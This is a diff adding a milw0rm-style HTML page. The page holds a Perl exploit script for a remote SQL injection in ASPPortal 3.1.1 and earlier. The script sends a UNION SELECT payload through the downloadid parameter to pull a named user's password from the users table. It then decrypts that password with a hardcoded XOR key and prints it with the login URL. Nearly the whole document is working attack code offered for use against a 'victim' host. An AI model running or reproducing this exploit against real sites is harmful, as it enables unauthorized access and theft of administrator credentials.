@@ -1,0 +1,87 @@
+<html><head><title>ASPPortal <= 3.1.1 (downloadid) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
+#Method found &amp; Exploit scripted by nukedx
+#Contacts &gt; ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com
+#Original advisory: http://www.nukedx.com/?viewdoc=21
+#Usage: aspp.pl &lt;host&gt; &lt;path&gt; &lt;user&gt;
+use IO::Socket;
+use Math::BigInt;
+if(@ARGV != 3) { usage(); }
+else { exploit(); }
+sub header()
+{
+  print &quot;\n- NukedX Security Advisory Nr.2006-21\r\n&quot;;
+  print &quot;- ASPPortal &lt;= 3.1.1 Remote SQL Injection Exploit\r\n&quot;;
+}
+sub usage() 
+{
+  header();
+  print &quot;- Usage: $0 &lt;host&gt; &lt;path&gt; &lt;user&gt;\r\n&quot;;
+  print &quot;- &lt;host&gt; -&gt; Victim's host ex: www.victim.com\r\n&quot;;
+  print &quot;- &lt;path&gt; -&gt; Path to ASPPortal  ex: /portal/\r\n&quot;;
+  print &quot;- &lt;user&gt; -&gt; Username that you want password. ex: admin\r\n&quot;;
+  exit();
+}
+sub decrypt ()
+{
+  $lp = length($appass);
+  $apkey = &quot;IY/;\$&gt;=3)?^-+7M32#Q]VOII.Q=OFMC`:P7_B;&lt;R/8U)XFHC&lt;SR_E\$.DLG'=I+@5%*+OP:F_=';'NSY`-^S.`AA=BJ3M0.WF#T5LGK(=/&lt;:+C2K/^7AI\$;PU'OME2+T8ND?W\$C(J\,;631'M-LD5F%%1TF_&amp;K2A-D-54[2P,#'*JU%6`0RF3CMF0(#T07U'FZ=&gt;#,+.AW_/+']DIB;2DTIA57TT&amp;-)O'/*F'M&gt;H.XH5W^0Y*=71+5*^`^PKJ(=E/X#7A:?,S&gt;R&amp;T;+B#&lt;:-*\@)X9F`_`%QA3Z95.?_T#1,\$2#FWW5PBH^*&lt;])A(S0@AVD8C^Q0R^T1D?(1+,YE71X+.*+U\$:3XO^Q].KG&amp;0N0];[LJ&lt;OZ6IN?7N4&lt;GTL?(M'4S8+3JMK5]HC%^1^+K;\\$WBXPA?F&amp;5^E\D\$7%*O/U[1/?8(5:1OVWV*1Z-%`:K&amp;V?X1,1KURD@3W0^D)&lt;OG40?(VJ4EWL5A5M&lt;\$A);CQ36R9I]*U#Q%1&lt;Y\&amp;SA%#1&lt;V&quot;;
+  if ($lp == 0) { die(&quot;- An error occurued\r\n&quot;); }
+  for ($i = 0; $i &lt; $lp ; $i++) {
+    $f = $lp - $i - 1; # Formula for getting character via substr...
+    $n = substr($apkey,$f,1);
+    $l = substr($appass,$f,1);
+    $appwd = chr(ord($n)^ord($l)).$appwd;
+  }
+  print &quot;- Password decrypted as: $appwd\r\n&quot;;
+  print &quot;- Lets go $aphost$apdir$apfinal for login\r\n&quot;;
+  exit();
+}
+sub exploit () 
+{
+  #Our variables...
+  $apserver = $ARGV[0];
+  $apserver =~ s/(http:\/\/)//eg;
+  $aphost   = &quot;http://&quot;.$apserver;
+  $apdir    = $ARGV[1];
+  $apport   = &quot;80&quot;;
+  $aptar    = &quot;content/downloads/download_click.asp?downloadid=&quot;;
+  $apfinal  = &quot;content/users/login.asp&quot;;
+  $apxp     = &quot;-1+UNION+SELECT+0,0,0,0,0,0,0,0,0,0,password+FROM+users+where+username='$ARGV[2]'&quot;;
+  $apreq    = $aphost.$apdir.$aptar.$apxp;
+  #Sending data...
+  header();
+  print &quot;- Trying to connect: $apserver\r\n&quot;;
+  $ap = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$apserver&quot;, PeerPort =&gt; &quot;$apport&quot;) || die &quot;- Connection failed...\n&quot;;
+  print $ap &quot;GET $apreq HTTP/1.1\n&quot;;
+  print $ap &quot;Accept: */*\n&quot;;
+  print $ap &quot;Referer: $aphost\n&quot;;
+  print $ap &quot;Accept-Language: tr\n&quot;;
+  print $ap &quot;User-Agent: NukeZilla\n&quot;;
+  print $ap &quot;Cache-Control: no-cache\n&quot;;
+  print $ap &quot;Host: $apserver\n&quot;;
+  print $ap &quot;Connection: close\n\n&quot;;
+  print &quot;- Connected...\r\n&quot;;
+  while ($answer = &lt;$ap&gt;) {
+    if ($answer =~ /string: &amp;quot;(.*?)&amp;quot;]'/) {
+      print &quot;- Exploit succeed! Getting $ARGV[2]'s information\r\n&quot;;
+      print &quot;- Username: $ARGV[2]\r\n&quot;;
+      print &quot;- Decrypting password....\r\n&quot;;
+      $appass = $1;
+      $appass =~ s/(&amp;quot;)/chr(34)/eg;
+      $appass =~ s/(&amp;lt;)/chr(60)/eg;
+      $appass =~ s/(&amp;gt;)/chr(62)/eg;
+      $appass =~ s/(&amp;nbsp;)/chr(32)/eg;
+      decrypt();
+    }
+    if ($answer =~ /number of columns/) { 
+      print &quot;- This version of ASPPortal is vulnerable too\r\n&quot;;
+      print &quot;- but default query of SQL-Inj. does not work on it\r\n&quot;;
+      print &quot;- So please edit query by manually adding null data..\r\n&quot;;
+      exit(); 
+    }
+  }
+  #Exploit failed...
+  print &quot;- Exploit failed\n&quot;
+}
+
+# milw0rm.com [2006-03-20]</pre></html>
